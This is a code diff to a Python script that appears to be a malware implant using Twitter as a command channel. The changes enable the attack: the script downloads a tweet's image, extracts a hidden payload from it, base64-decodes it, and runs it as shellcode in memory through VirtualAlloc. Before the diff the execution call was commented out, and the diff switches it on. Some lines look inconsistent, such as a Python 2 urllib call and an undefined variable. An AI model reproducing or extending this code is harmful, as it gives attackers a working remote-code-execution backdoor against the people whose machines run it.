@@ -60,7 +60,8 @@ def search_hashtag(cc_hastag):
 
 def run_shellcode(shellcode_str):
     # decode the shellcode from base64 
-    shellcode = bytearray(shellcode_str)
+    print("Running shellcode...")
+    shellcode = bytearray(base64.b64decode(shellcode_str))
     
     ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                             ctypes.c_int(len(shellcode)),
@@ -98,11 +99,11 @@ def process_tweet(tweet):
 
     if(len(tweet.media) > 0):
         print("Downloading tweet image...")
-        urllib.request.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
+        urllib.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
         print("Downloaded.")
         print("Decrypting hidden message...")
         payload = get_secret("cmd.png")
-        #run_shellcode(payload)
+        run_shellcode(payload)
 def extract_urls():
     return re.search("(?P<url>https?://[^\s]+)", myString).group("url")
 
